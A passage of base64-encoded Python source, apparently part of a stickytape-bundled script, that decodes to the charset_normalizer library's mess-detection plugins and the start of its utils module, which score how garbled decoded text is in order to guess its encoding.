QgPT0gMDpcbiAgICAgICAgICAgIHJldHVybiAwLjBcblxuICAgICAgICByYXRpb19vZl9zdXNwaWNpb3VzX3JhbmdlX3VzYWdlID0gKFxuICAgICAgICAgICAgc2VsZi5fc3VzcGljaW91c19zdWNjZXNzaXZlX3JhbmdlX2NvdW50ICogMlxuICAgICAgICApIC8gc2VsZi5fY2hhcmFjdGVyX2NvdW50ICAjIHR5cGU6IGZsb2F0XG5cbiAgICAgICAgaWYgcmF0aW9fb2Zfc3VzcGljaW91c19yYW5nZV91c2FnZSA8IDAuMTpcbiAgICAgICAgICAgIHJldHVybiAwLjBcblxuICAgICAgICByZXR1cm4gcmF0aW9fb2Zfc3VzcGljaW91c19yYW5nZV91c2FnZVxuXG5cbmNsYXNzIFN1cGVyV2VpcmRXb3JkUGx1Z2luKE1lc3NEZXRlY3RvclBsdWdpbik6XG4gICAgZGVmIF9faW5pdF9fKHNlbGYpIC0+IE5vbmU6XG4gICAgICAgIHNlbGYuX3dvcmRfY291bnQgPSAwICAjIHR5cGU6IGludFxuICAgICAgICBzZWxmLl9iYWRfd29yZF9jb3VudCA9IDAgICMgdHlwZTogaW50XG4gICAgICAgIHNlbGYuX2ZvcmVpZ25fbG9uZ19jb3VudCA9IDAgICMgdHlwZTogaW50XG5cbiAgICAgICAgc2VsZi5faXNfY3VycmVudF93b3JkX2JhZCA9IEZhbHNlICAjIHR5cGU6IGJvb2xcbiAgICAgICAgc2VsZi5fZm9yZWlnbl9sb25nX3dhdGNoID0gRmFsc2UgICMgdHlwZTogYm9vbFxuXG4gICAgICAgIHNlbGYuX2NoYXJhY3Rlcl9jb3VudCA9IDAgICMgdHlwZTogaW50XG4gICAgICAgIHNlbGYuX2JhZF9jaGFyYWN0ZXJfY291bnQgPSAwICAjIHR5cGU6IGludFxuXG4gICAgICAgIHNlbGYuX2J1ZmZlciA9ICIiICAjIHR5cGU6IHN0clxuICAgICAgICBzZWxmLl9idWZmZXJfYWNjZW50X2NvdW50ID0gMCAgIyB0eXBlOiBpbnRcblxuICAgIGRlZiBlbGlnaWJsZShzZWxmLCBjaGFyYWN0ZXI6IHN0cikgLT4gYm9vbDpcbiAgICAgICAgcmV0dXJuIFRydWVcblxuICAgIGRlZiBmZWVkKHNlbGYsIGNoYXJhY3Rlcjogc3RyKSAtPiBOb25lOlxuICAgICAgICBpZiBjaGFyYWN0ZXIuaXNhbHBoYSgpOlxuICAgICAgICAgICAgc2VsZi5fYnVmZmVyID0gIiIuam9pbihbc2VsZi5fYnVmZmVyLCBjaGFyYWN0ZXJdKVxuICAgICAgICAgICAgaWYgaXNfYWNjZW50dWF0ZWQoY2hhcmFjdGVyKTpcbiAgICAgICAgICAgICAgICBzZWxmLl9idWZmZXJfYWNjZW50X2NvdW50ICs9IDFcbiAgICAgICAgICAgIGlmIChcbiAgICAgICAgICAgICAgICBzZWxmLl9mb3JlaWduX2xvbmdfd2F0Y2ggaXMgRmFsc2VcbiAgICAgICAgICAgICAgICBhbmQgKGlzX2xhdGluKGNoYXJhY3RlcikgaXMgRmFsc2Ugb3IgaXNfYWNjZW50dWF0ZWQoY2hhcmFjdGVyKSlcbiAgICAgICAgICAgICAgICBhbmQgaXNfY2prKGNoYXJhY3RlcikgaXMgRmFsc2VcbiAgICAgICAgICAgICAgICBhbmQgaXNfaGFuZ3VsKGNoYXJhY3RlcikgaXMgRmFsc2VcbiAgICAgICAgICAgICAgICBhbmQgaXNfa2F0YWthbmEoY2hhcmFjdGVyKSBpcyBGYWxzZVxuICAgICAgICAgICAgICAgIGFuZCBpc19oaXJhZ2FuYShjaGFyYWN0ZXIpIGlzIEZhbHNlXG4gICAgICAgICAgICAgICAgYW5kIGlzX3RoYWkoY2hhcmFjdGVyKSBpcyBGYWxzZVxuICAgICAgICAgICAgKTpcbiAgICAgICAgICAgICAgICBzZWxmLl9mb3JlaWduX2xvbmdfd2F0Y2ggPSBUcnVlXG4gICAgICAgICAgICByZXR1cm5cbiAgICAgICAgaWYgbm90IHNlbGYuX2J1ZmZlcjpcbiAgICAgICAgICAgIHJldHVyblxuICAgICAgICBpZiAoXG4gICAgICAgICAgICBjaGFyYWN0ZXIuaXNzcGFjZSgpIG9yIGlzX3B1bmN0dWF0aW9uKGNoYXJhY3Rlcikgb3IgaXNfc2VwYXJhdG9yKGNoYXJhY3RlcilcbiAgICAgICAgKSBhbmQgc2VsZi5fYnVmZmVyOlxuICAgICAgICAgICAgc2VsZi5fd29yZF9jb3VudCArPSAxXG4gICAgICAgICAgICBidWZmZXJfbGVuZ3RoID0gbGVuKHNlbGYuX2J1ZmZlcikgICMgdHlwZTogaW50XG5cbiAgICAgICAgICAgIHNlbGYuX2NoYXJhY3Rlcl9jb3VudCArPSBidWZmZXJfbGVuZ3RoXG5cbiAgICAgICAgICAgIGlmIGJ1ZmZlcl9sZW5ndGggPj0gNDpcbiAgICAgICAgICAgICAgICBpZiBzZWxmLl9idWZmZXJfYWNjZW50X2NvdW50IC8gYnVmZmVyX2xlbmd0aCA+IDAuMzQ6XG4gICAgICAgICAgICAgICAgICAgIHNlbGYuX2lzX2N1cnJlbnRfd29yZF9iYWQgPSBUcnVlXG4gICAgICAgICAgICAgICAgIyBXb3JkL0J1ZmZlciBlbmRpbmcgd2l0aCBhIHVwcGVyIGNhc2UgYWNjZW50dWF0ZWQgbGV0dGVyIGFyZSBzbyByYXJlLFxuICAgICAgICAgICAgICAgICMgdGhhdCB3ZSB3aWxsIGNvbnNpZGVyIHRoZW0gYWxsIGFzIHN1c3BpY2lvdXMuIFNhbWUgd2VpZ2h0IGFzIGZvcmVpZ25fbG9uZyBzdXNwaWNpb3VzLlxuICAgICAgICAgICAgICAgIGlmIGlzX2FjY2VudHVhdGVkKHNlbGYuX2J1ZmZlclstMV0pIGFuZCBzZWxmLl9idWZmZXJbLTFdLmlzdXBwZXIoKTpcbiAgICAgICAgICAgICAgICAgICAgc2VsZi5fZm9yZWlnbl9sb25nX2NvdW50ICs9IDFcbiAgICAgICAgICAgICAgICAgICAgc2VsZi5faXNfY3VycmVudF93b3JkX2JhZCA9IFRydWVcbiAgICAgICAgICAgIGlmIGJ1ZmZlcl9sZW5ndGggPj0gMjQgYW5kIHNlbGYuX2ZvcmVpZ25fbG9uZ193YXRjaDpcbiAgICAgICAgICAgICAgICBzZWxmLl9mb3JlaWduX2xvbmdfY291bnQgKz0gMVxuICAgICAgICAgICAgICAgIHNlbGYuX2lzX2N1cnJlbnRfd29yZF9iYWQgPSBUcnVlXG5cbiAgICAgICAgICAgIGlmIHNlbGYuX2lzX2N1cnJlbnRfd29yZF9iYWQ6XG4gICAgICAgICAgICAgICAgc2VsZi5fYmFkX3dvcmRfY291bnQgKz0gMVxuICAgICAgICAgICAgICAgIHNlbGYuX2JhZF9jaGFyYWN0ZXJfY291bnQgKz0gbGVuKHNlbGYuX2J1ZmZlcilcbiAgICAgICAgICAgICAgICBzZWxmLl9pc19jdXJyZW50X3dvcmRfYmFkID0gRmFsc2VcblxuICAgICAgICAgICAgc2VsZi5fZm9yZWlnbl9sb25nX3dhdGNoID0gRmFsc2VcbiAgICAgICAgICAgIHNlbGYuX2J1ZmZlciA9ICIiXG4gICAgICAgICAgICBzZWxmLl9idWZmZXJfYWNjZW50X2NvdW50ID0gMFxuICAgICAgICBlbGlmIChcbiAgICAgICAgICAgIGNoYXJhY3RlciBub3QgaW4geyI8IiwgIj4iLCAiLSIsICI9IiwgIn4iLCAifCIsICJfIn1cbiAgICAgICAgICAgIGFuZCBjaGFyYWN0ZXIuaXNkaWdpdCgpIGlzIEZhbHNlXG4gICAgICAgICAgICBhbmQgaXNfc3ltYm9sKGNoYXJhY3RlcilcbiAgICAgICAgKTpcbiAgICAgICAgICAgIHNlbGYuX2lzX2N1cnJlbnRfd29yZF9iYWQgPSBUcnVlXG4gICAgICAgICAgICBzZWxmLl9idWZmZXIgKz0gY2hhcmFjdGVyXG5cbiAgICBkZWYgcmVzZXQoc2VsZikgLT4gTm9uZTogICMgcHJhZ21hOiBubyBjb3ZlclxuICAgICAgICBzZWxmLl9idWZmZXIgPSAiIlxuICAgICAgICBzZWxmLl9pc19jdXJyZW50X3dvcmRfYmFkID0gRmFsc2VcbiAgICAgICAgc2VsZi5fZm9yZWlnbl9sb25nX3dhdGNoID0gRmFsc2VcbiAgICAgICAgc2VsZi5fYmFkX3dvcmRfY291bnQgPSAwXG4gICAgICAgIHNlbGYuX3dvcmRfY291bnQgPSAwXG4gICAgICAgIHNlbGYuX2NoYXJhY3Rlcl9jb3VudCA9IDBcbiAgICAgICAgc2VsZi5fYmFkX2NoYXJhY3Rlcl9jb3VudCA9IDBcbiAgICAgICAgc2VsZi5fZm9yZWlnbl9sb25nX2NvdW50ID0gMFxuXG4gICAgQHByb3BlcnR5XG4gICAgZGVmIHJhdGlvKHNlbGYpIC0+IGZsb2F0OlxuICAgICAgICBpZiBzZWxmLl93b3JkX2NvdW50IDw9IDEwIGFuZCBzZWxmLl9mb3JlaWduX2xvbmdfY291bnQgPT0gMDpcbiAgICAgICAgICAgIHJldHVybiAwLjBcblxuICAgICAgICByZXR1cm4gc2VsZi5fYmFkX2NoYXJhY3Rlcl9jb3VudCAvIHNlbGYuX2NoYXJhY3Rlcl9jb3VudFxuXG5cbmNsYXNzIENqa0ludmFsaWRTdG9wUGx1Z2luKE1lc3NEZXRlY3RvclBsdWdpbik6XG4gICAgIiIiXG4gICAgR0IoQ2hpbmVzZSkgYmFzZWQgZW5jb2Rpbmcgb2Z0ZW4gcmVuZGVyIHRoZSBzdG9wIGluY29ycmVjdGx5IHdoZW4gdGhlIGNvbnRlbnQgZG9lcyBub3QgZml0IGFuZFxuICAgIGNhbiBiZSBlYXNpbHkgZGV0ZWN0ZWQuIFNlYXJjaGluZyBmb3IgdGhlIG92ZXJ1c2Ugb2YgXCdceGU0XHhiOFx4ODVcJyBhbmQgXCdceGU0XHhiOFx4ODRcJy5cbiAgICAiIiJcblxuICAgIGRlZiBfX2luaXRfXyhzZWxmKSAtPiBOb25lOlxuICAgICAgICBzZWxmLl93cm9uZ19zdG9wX2NvdW50ID0gMCAgIyB0eXBlOiBpbnRcbiAgICAgICAgc2VsZi5fY2prX2NoYXJhY3Rlcl9jb3VudCA9IDAgICMgdHlwZTogaW50XG5cbiAgICBkZWYgZWxpZ2libGUoc2VsZiwgY2hhcmFjdGVyOiBzdHIpIC0+IGJvb2w6XG4gICAgICAgIHJldHVybiBUcnVlXG5cbiAgICBkZWYgZmVlZChzZWxmLCBjaGFyYWN0ZXI6IHN0cikgLT4gTm9uZTpcbiAgICAgICAgaWYgY2hhcmFjdGVyIGluIHsiXHhlNFx4YjhceDg1IiwgIlx4ZTRceGI4XHg4NCJ9OlxuICAgICAgICAgICAgc2VsZi5fd3Jvbmdfc3RvcF9jb3VudCArPSAxXG4gICAgICAgICAgICByZXR1cm5cbiAgICAgICAgaWYgaXNfY2prKGNoYXJhY3Rlcik6XG4gICAgICAgICAgICBzZWxmLl9jamtfY2hhcmFjdGVyX2NvdW50ICs9IDFcblxuICAgIGRlZiByZXNldChzZWxmKSAtPiBOb25lOiAgIyBwcmFnbWE6IG5vIGNvdmVyXG4gICAgICAgIHNlbGYuX3dyb25nX3N0b3BfY291bnQgPSAwXG4gICAgICAgIHNlbGYuX2Nqa19jaGFyYWN0ZXJfY291bnQgPSAwXG5cbiAgICBAcHJvcGVydHlcbiAgICBkZWYgcmF0aW8oc2VsZikgLT4gZmxvYXQ6XG4gICAgICAgIGlmIHNlbGYuX2Nqa19jaGFyYWN0ZXJfY291bnQgPCAxNjpcbiAgICAgICAgICAgIHJldHVybiAwLjBcbiAgICAgICAgcmV0dXJuIHNlbGYuX3dyb25nX3N0b3BfY291bnQgLyBzZWxmLl9jamtfY2hhcmFjdGVyX2NvdW50XG5cblxuY2xhc3MgQXJjaGFpY1VwcGVyTG93ZXJQbHVnaW4oTWVzc0RldGVjdG9yUGx1Z2luKTpcbiAgICBkZWYgX19pbml0X18oc2VsZikgLT4gTm9uZTpcbiAgICAgICAgc2VsZi5fYnVmID0gRmFsc2UgICMgdHlwZTogYm9vbFxuXG4gICAgICAgIHNlbGYuX2NoYXJhY3Rlcl9jb3VudF9zaW5jZV9sYXN0X3NlcCA9IDAgICMgdHlwZTogaW50XG5cbiAgICAgICAgc2VsZi5fc3VjY2Vzc2l2ZV91cHBlcl9sb3dlcl9jb3VudCA9IDAgICMgdHlwZTogaW50XG4gICAgICAgIHNlbGYuX3N1Y2Nlc3NpdmVfdXBwZXJfbG93ZXJfY291bnRfZmluYWwgPSAwICAjIHR5cGU6IGludFxuXG4gICAgICAgIHNlbGYuX2NoYXJhY3Rlcl9jb3VudCA9IDAgICMgdHlwZTogaW50XG5cbiAgICAgICAgc2VsZi5fbGFzdF9hbHBoYV9zZWVuID0gTm9uZSAgIyB0eXBlOiBPcHRpb25hbFtzdHJdXG4gICAgICAgIHNlbGYuX2N1cnJlbnRfYXNjaWlfb25seSA9IFRydWUgICMgdHlwZTogYm9vbFxuXG4gICAgZGVmIGVsaWdpYmxlKHNlbGYsIGNoYXJhY3Rlcjogc3RyKSAtPiBib29sOlxuICAgICAgICByZXR1cm4gVHJ1ZVxuXG4gICAgZGVmIGZlZWQoc2VsZiwgY2hhcmFjdGVyOiBzdHIpIC0+IE5vbmU6XG4gICAgICAgIGlzX2NvbmNlcm5lZCA9IGNoYXJhY3Rlci5pc2FscGhhKCkgYW5kIGlzX2Nhc2VfdmFyaWFibGUoY2hhcmFjdGVyKVxuICAgICAgICBjaHVua19zZXAgPSBpc19jb25jZXJuZWQgaXMgRmFsc2VcblxuICAgICAgICBpZiBjaHVua19zZXAgYW5kIHNlbGYuX2NoYXJhY3Rlcl9jb3VudF9zaW5jZV9sYXN0X3NlcCA+IDA6XG4gICAgICAgICAgICBpZiAoXG4gICAgICAgICAgICAgICAgc2VsZi5fY2hhcmFjdGVyX2NvdW50X3NpbmNlX2xhc3Rfc2VwIDw9IDY0XG4gICAgICAgICAgICAgICAgYW5kIGNoYXJhY3Rlci5pc2RpZ2l0KCkgaXMgRmFsc2VcbiAgICAgICAgICAgICAgICBhbmQgc2VsZi5fY3VycmVudF9hc2NpaV9vbmx5IGlzIEZhbHNlXG4gICAgICAgICAgICApOlxuICAgICAgICAgICAgICAgIHNlbGYuX3N1Y2Nlc3NpdmVfdXBwZXJfbG93ZXJfY291bnRfZmluYWwgKz0gKFxuICAgICAgICAgICAgICAgICAgICBzZWxmLl9zdWNjZXNzaXZlX3VwcGVyX2xvd2VyX2NvdW50XG4gICAgICAgICAgICAgICAgKVxuXG4gICAgICAgICAgICBzZWxmLl9zdWNjZXNzaXZlX3VwcGVyX2xvd2VyX2NvdW50ID0gMFxuICAgICAgICAgICAgc2VsZi5fY2hhcmFjdGVyX2NvdW50X3NpbmNlX2xhc3Rfc2VwID0gMFxuICAgICAgICAgICAgc2VsZi5fbGFzdF9hbHBoYV9zZWVuID0gTm9uZVxuICAgICAgICAgICAgc2VsZi5fYnVmID0gRmFsc2VcbiAgICAgICAgICAgIHNlbGYuX2NoYXJhY3Rlcl9jb3VudCArPSAxXG4gICAgICAgICAgICBzZWxmLl9jdXJyZW50X2FzY2lpX29ubHkgPSBUcnVlXG5cbiAgICAgICAgICAgIHJldHVyblxuXG4gICAgICAgIGlmIHNlbGYuX2N1cnJlbnRfYXNjaWlfb25seSBpcyBUcnVlIGFuZCBpc19hc2NpaShjaGFyYWN0ZXIpIGlzIEZhbHNlOlxuICAgICAgICAgICAgc2VsZi5fY3VycmVudF9hc2NpaV9vbmx5ID0gRmFsc2VcblxuICAgICAgICBpZiBzZWxmLl9sYXN0X2FscGhhX3NlZW4gaXMgbm90IE5vbmU6XG4gICAgICAgICAgICBpZiAoY2hhcmFjdGVyLmlzdXBwZXIoKSBhbmQgc2VsZi5fbGFzdF9hbHBoYV9zZWVuLmlzbG93ZXIoKSkgb3IgKFxuICAgICAgICAgICAgICAgIGNoYXJhY3Rlci5pc2xvd2VyKCkgYW5kIHNlbGYuX2xhc3RfYWxwaGFfc2Vlbi5pc3VwcGVyKClcbiAgICAgICAgICAgICk6XG4gICAgICAgICAgICAgICAgaWYgc2VsZi5fYnVmIGlzIFRydWU6XG4gICAgICAgICAgICAgICAgICAgIHNlbGYuX3N1Y2Nlc3NpdmVfdXBwZXJfbG93ZXJfY291bnQgKz0gMlxuICAgICAgICAgICAgICAgICAgICBzZWxmLl9idWYgPSBGYWxzZVxuICAgICAgICAgICAgICAgIGVsc2U6XG4gICAgICAgICAgICAgICAgICAgIHNlbGYuX2J1ZiA9IFRydWVcbiAgICAgICAgICAgIGVsc2U6XG4gICAgICAgICAgICAgICAgc2VsZi5fYnVmID0gRmFsc2VcblxuICAgICAgICBzZWxmLl9jaGFyYWN0ZXJfY291bnQgKz0gMVxuICAgICAgICBzZWxmLl9jaGFyYWN0ZXJfY291bnRfc2luY2VfbGFzdF9zZXAgKz0gMVxuICAgICAgICBzZWxmLl9sYXN0X2FscGhhX3NlZW4gPSBjaGFyYWN0ZXJcblxuICAgIGRlZiByZXNldChzZWxmKSAtPiBOb25lOiAgIyBwcmFnbWE6IG5vIGNvdmVyXG4gICAgICAgIHNlbGYuX2NoYXJhY3Rlcl9jb3VudCA9IDBcbiAgICAgICAgc2VsZi5fY2hhcmFjdGVyX2NvdW50X3NpbmNlX2xhc3Rfc2VwID0gMFxuICAgICAgICBzZWxmLl9zdWNjZXNzaXZlX3VwcGVyX2xvd2VyX2NvdW50ID0gMFxuICAgICAgICBzZWxmLl9zdWNjZXNzaXZlX3VwcGVyX2xvd2VyX2NvdW50X2ZpbmFsID0gMFxuICAgICAgICBzZWxmLl9sYXN0X2FscGhhX3NlZW4gPSBOb25lXG4gICAgICAgIHNlbGYuX2J1ZiA9IEZhbHNlXG4gICAgICAgIHNlbGYuX2N1cnJlbnRfYXNjaWlfb25seSA9IFRydWVcblxuICAgIEBwcm9wZXJ0eVxuICAgIGRlZiByYXRpbyhzZWxmKSAtPiBmbG9hdDpcbiAgICAgICAgaWYgc2VsZi5fY2hhcmFjdGVyX2NvdW50ID09IDA6XG4gICAgICAgICAgICByZXR1cm4gMC4wXG5cbiAgICAgICAgcmV0dXJuIHNlbGYuX3N1Y2Nlc3NpdmVfdXBwZXJfbG93ZXJfY291bnRfZmluYWwgLyBzZWxmLl9jaGFyYWN0ZXJfY291bnRcblxuXG5kZWYgaXNfc3VzcGljaW91c2x5X3N1Y2Nlc3NpdmVfcmFuZ2UoXG4gICAgdW5pY29kZV9yYW5nZV9hOiBPcHRpb25hbFtzdHJdLCB1bmljb2RlX3JhbmdlX2I6IE9wdGlvbmFsW3N0cl1cbikgLT4gYm9vbDpcbiAgICAiIiJcbiAgICBEZXRlcm1pbmUgaWYgdHdvIFVuaWNvZGUgcmFuZ2Ugc2VlbiBuZXh0IHRvIGVhY2ggb3RoZXIgY2FuIGJlIGNvbnNpZGVyZWQgYXMgc3VzcGljaW91cy5cbiAgICAiIiJcbiAgICBpZiB1bmljb2RlX3JhbmdlX2EgaXMgTm9uZSBvciB1bmljb2RlX3JhbmdlX2IgaXMgTm9uZTpcbiAgICAgICAgcmV0dXJuIFRydWVcblxuICAgIGlmIHVuaWNvZGVfcmFuZ2VfYSA9PSB1bmljb2RlX3JhbmdlX2I6XG4gICAgICAgIHJldHVybiBGYWxzZVxuXG4gICAgaWYgIkxhdGluIiBpbiB1bmljb2RlX3JhbmdlX2EgYW5kICJMYXRpbiIgaW4gdW5pY29kZV9yYW5nZV9iOlxuICAgICAgICByZXR1cm4gRmFsc2VcblxuICAgIGlmICJFbW90aWNvbnMiIGluIHVuaWNvZGVfcmFuZ2VfYSBvciAiRW1vdGljb25zIiBpbiB1bmljb2RlX3JhbmdlX2I6XG4gICAgICAgIHJldHVybiBGYWxzZVxuXG4gICAgIyBMYXRpbiBjaGFyYWN0ZXJzIGNhbiBiZSBhY2NvbXBhbmllZCB3aXRoIGEgY29tYmluaW5nIGRpYWNyaXRpY2FsIG1hcmtcbiAgICAjIGVnLiBWaWV0bmFtZXNlLlxuICAgIGlmICgiTGF0aW4iIGluIHVuaWNvZGVfcmFuZ2VfYSBvciAiTGF0aW4iIGluIHVuaWNvZGVfcmFuZ2VfYikgYW5kIChcbiAgICAgICAgIkNvbWJpbmluZyIgaW4gdW5pY29kZV9yYW5nZV9hIG9yICJDb21iaW5pbmciIGluIHVuaWNvZGVfcmFuZ2VfYlxuICAgICk6XG4gICAgICAgIHJldHVybiBGYWxzZVxuXG4gICAga2V5d29yZHNfcmFuZ2VfYSwga2V5d29yZHNfcmFuZ2VfYiA9IHVuaWNvZGVfcmFuZ2VfYS5zcGxpdChcbiAgICAgICAgIiAiXG4gICAgKSwgdW5pY29kZV9yYW5nZV9iLnNwbGl0KCIgIilcblxuICAgIGZvciBlbCBpbiBrZXl3b3Jkc19yYW5nZV9hOlxuICAgICAgICBpZiBlbCBpbiBVTklDT0RFX1NFQ09OREFSWV9SQU5HRV9LRVlXT1JEOlxuICAgICAgICAgICAgY29udGludWVcbiAgICAgICAgaWYgZWwgaW4ga2V5d29yZHNfcmFuZ2VfYjpcbiAgICAgICAgICAgIHJldHVybiBGYWxzZVxuXG4gICAgIyBKYXBhbmVzZSBFeGNlcHRpb25cbiAgICByYW5nZV9hX2pwX2NoYXJzLCByYW5nZV9iX2pwX2NoYXJzID0gKFxuICAgICAgICB1bmljb2RlX3JhbmdlX2FcbiAgICAgICAgaW4gKFxuICAgICAgICAgICAgIkhpcmFnYW5hIixcbiAgICAgICAgICAgICJLYXRha2FuYSIsXG4gICAgICAgICksXG4gICAgICAgIHVuaWNvZGVfcmFuZ2VfYiBpbiAoIkhpcmFnYW5hIiwgIkthdGFrYW5hIiksXG4gICAgKVxuICAgIGlmIChyYW5nZV9hX2pwX2NoYXJzIG9yIHJhbmdlX2JfanBfY2hhcnMpIGFuZCAoXG4gICAgICAgICJDSksiIGluIHVuaWNvZGVfcmFuZ2VfYSBvciAiQ0pLIiBpbiB1bmljb2RlX3JhbmdlX2JcbiAgICApOlxuICAgICAgICByZXR1cm4gRmFsc2VcbiAgICBpZiByYW5nZV9hX2pwX2NoYXJzIGFuZCByYW5nZV9iX2pwX2NoYXJzOlxuICAgICAgICByZXR1cm4gRmFsc2VcblxuICAgIGlmICJIYW5ndWwiIGluIHVuaWNvZGVfcmFuZ2VfYSBvciAiSGFuZ3VsIiBpbiB1bmljb2RlX3JhbmdlX2I6XG4gICAgICAgIGlmICJDSksiIGluIHVuaWNvZGVfcmFuZ2VfYSBvciAiQ0pLIiBpbiB1bmljb2RlX3JhbmdlX2I6XG4gICAgICAgICAgICByZXR1cm4gRmFsc2VcbiAgICAgICAgaWYgdW5pY29kZV9yYW5nZV9hID09ICJCYXNpYyBMYXRpbiIgb3IgdW5pY29kZV9yYW5nZV9iID09ICJCYXNpYyBMYXRpbiI6XG4gICAgICAgICAgICByZXR1cm4gRmFsc2VcblxuICAgICMgQ2hpbmVzZS9KYXBhbmVzZSB1c2UgZGVkaWNhdGVkIHJhbmdlIGZvciBwdW5jdHVhdGlvbiBhbmQvb3Igc2VwYXJhdG9ycy5cbiAgICBpZiAoIkNKSyIgaW4gdW5pY29kZV9yYW5nZV9hIG9yICJDSksiIGluIHVuaWNvZGVfcmFuZ2VfYikgb3IgKFxuICAgICAgICB1bmljb2RlX3JhbmdlX2EgaW4gWyJLYXRha2FuYSIsICJIaXJhZ2FuYSJdXG4gICAgICAgIGFuZCB1bmljb2RlX3JhbmdlX2IgaW4gWyJLYXRha2FuYSIsICJIaXJhZ2FuYSJdXG4gICAgKTpcbiAgICAgICAgaWYgIlB1bmN0dWF0aW9uIiBpbiB1bmljb2RlX3JhbmdlX2Egb3IgIlB1bmN0dWF0aW9uIiBpbiB1bmljb2RlX3JhbmdlX2I6XG4gICAgICAgICAgICByZXR1cm4gRmFsc2VcbiAgICAgICAgaWYgIkZvcm1zIiBpbiB1bmljb2RlX3JhbmdlX2Egb3IgIkZvcm1zIiBpbiB1bmljb2RlX3JhbmdlX2I6XG4gICAgICAgICAgICByZXR1cm4gRmFsc2VcblxuICAgIHJldHVybiBUcnVlXG5cblxuQGxydV9jYWNoZShtYXhzaXplPTIwNDgpXG5kZWYgbWVzc19yYXRpbyhcbiAgICBkZWNvZGVkX3NlcXVlbmNlOiBzdHIsIG1heGltdW1fdGhyZXNob2xkOiBmbG9hdCA9IDAuMiwgZGVidWc6IGJvb2wgPSBGYWxzZVxuKSAtPiBmbG9hdDpcbiAgICAiIiJcbiAgICBDb21wdXRlIGEgbWVzcyByYXRpbyBnaXZlbiBhIGRlY29kZWQgYnl0ZXMgc2VxdWVuY2UuIFRoZSBtYXhpbXVtIHRocmVzaG9sZCBkb2VzIHN0b3AgdGhlIGNvbXB1dGF0aW9uIGVhcmxpZXIuXG4gICAgIiIiXG5cbiAgICBkZXRlY3RvcnMgPSBbXG4gICAgICAgIG1kX2NsYXNzKCkgZm9yIG1kX2NsYXNzIGluIE1lc3NEZXRlY3RvclBsdWdpbi5fX3N1YmNsYXNzZXNfXygpXG4gICAgXSAgIyB0eXBlOiBMaXN0W01lc3NEZXRlY3RvclBsdWdpbl1cblxuICAgIGxlbmd0aCA9IGxlbihkZWNvZGVkX3NlcXVlbmNlKSArIDEgICMgdHlwZTogaW50XG5cbiAgICBtZWFuX21lc3NfcmF0aW8gPSAwLjAgICMgdHlwZTogZmxvYXRcblxuICAgIGlmIGxlbmd0aCA8IDUxMjpcbiAgICAgICAgaW50ZXJtZWRpYXJ5X21lYW5fbWVzc19yYXRpb19jYWxjID0gMzIgICMgdHlwZTogaW50XG4gICAgZWxpZiBsZW5ndGggPD0gMTAyNDpcbiAgICAgICAgaW50ZXJtZWRpYXJ5X21lYW5fbWVzc19yYXRpb19jYWxjID0gNjRcbiAgICBlbHNlOlxuICAgICAgICBpbnRlcm1lZGlhcnlfbWVhbl9tZXNzX3JhdGlvX2NhbGMgPSAxMjhcblxuICAgIGZvciBjaGFyYWN0ZXIsIGluZGV4IGluIHppcChkZWNvZGVkX3NlcXVlbmNlICsgIlxcbiIsIHJhbmdlKGxlbmd0aCkpOlxuICAgICAgICBmb3IgZGV0ZWN0b3IgaW4gZGV0ZWN0b3JzOlxuICAgICAgICAgICAgaWYgZGV0ZWN0b3IuZWxpZ2libGUoY2hhcmFjdGVyKTpcbiAgICAgICAgICAgICAgICBkZXRlY3Rvci5mZWVkKGNoYXJhY3RlcilcblxuICAgICAgICBpZiAoXG4gICAgICAgICAgICBpbmRleCA+IDAgYW5kIGluZGV4ICUgaW50ZXJtZWRpYXJ5X21lYW5fbWVzc19yYXRpb19jYWxjID09IDBcbiAgICAgICAgKSBvciBpbmRleCA9PSBsZW5ndGggLSAxOlxuICAgICAgICAgICAgbWVhbl9tZXNzX3JhdGlvID0gc3VtKGR0LnJhdGlvIGZvciBkdCBpbiBkZXRlY3RvcnMpXG5cbiAgICAgICAgICAgIGlmIG1lYW5fbWVzc19yYXRpbyA+PSBtYXhpbXVtX3RocmVzaG9sZDpcbiAgICAgICAgICAgICAgICBicmVha1xuXG4gICAgaWYgZGVidWc6XG4gICAgICAgIGZvciBkdCBpbiBkZXRlY3RvcnM6ICAjIHByYWdtYTogbm9jb3ZlclxuICAgICAgICAgICAgcHJpbnQoZHQuX19jbGFzc19fLCBkdC5yYXRpbylcblxuICAgIHJldHVybiByb3VuZChtZWFuX21lc3NfcmF0aW8sIDMpXG4nKQogICAgX19zdGlja3l0YXBlX3dyaXRlX21vZHVsZSgnY2hhcnNldF9ub3JtYWxpemVyL3V0aWxzLnB5JywgYid0cnk6XG4gICAgaW1wb3J0IHVuaWNvZGVkYXRhMiBhcyB1bmljb2RlZGF0YVxuZXhjZXB0IEltcG9ydEVycm9yOlxuICAgIGltcG9ydCB1bmljb2RlZGF0YSAgIyB0eXBlOiBpZ25vcmVbbm8tcmVkZWZdXG5cbmltcG9ydCBpbXBvcnRsaWJcbmltcG9ydCBsb2dnaW5nXG5mcm9tIGNvZGVjcyBpbXBvcnQgSW5jcmVtZW50YWxEZWNvZGVyXG5mcm9tIGVuY29kaW5ncy5hbGlhc2VzIGltcG9ydCBhbGlhc2VzXG5mcm9tIGZ1bmN0b29scyBpbXBvcnQgbHJ1X2NhY2hlXG5mcm9tIHJlIGltcG9ydCBmaW5kYWxsXG5mcm9tIHR5cGluZyBpbXBvcnQgTGlzdCwgT3B0aW9uYWwsIFNldCwgVHVwbGUsIFVuaW9uXG5cbmZyb20gX211bHRpYnl0ZWNvZGVjIGltcG9ydCBNdWx0aWJ5dGVJbmNyZW1lbnRhbERlY29kZXIgICMgdHlwZTogaWdub3JlXG5cbmZyb20gLmNvbnN0YW50IGltcG9ydCAoXG4gICAgRU5DT0RJTkdfTUFSS1MsXG4gICAgSUFOQV9TVVBQT1JURURfU0lNSUxBUixcbiAgICBSRV9QT1NTSUJMRV9FTkNPRElOR19JTkRJQ0FUSU9OLFxuICAgIFVOSUNPREVfUkFOR0VTX0NPTUJJTkVELFxuICAgIFVOSUNPREVfU0VDT05EQVJZX1JBTkdFX0tFWVdPUkQsXG4gICAgVVRGOF9NQVhJTUFMX0FMTE9DQVRJT04sXG4pXG5cblxuQGxydV9jYWNoZShtYXhzaXplPVVURjhfTUFYSU1BTF9BTExPQ0FUSU9OKVxuZGVmIGlzX2FjY2VudHVhdGVkKGNoYXJhY3Rlcjogc3RyKSAtPiBib29sOlxuICAgIHRyeTpcbiAgICAgICAgZGVzY3JpcHRpb24gPSB1bmljb2RlZGF0YS5uYW1lKGNoYXJhY3RlcikgICMgdHlwZTogc3RyXG4gICAgZXhjZXB0IFZhbHVlRXJyb3I6XG4gICAgICAgIHJldHVybiBGYWxz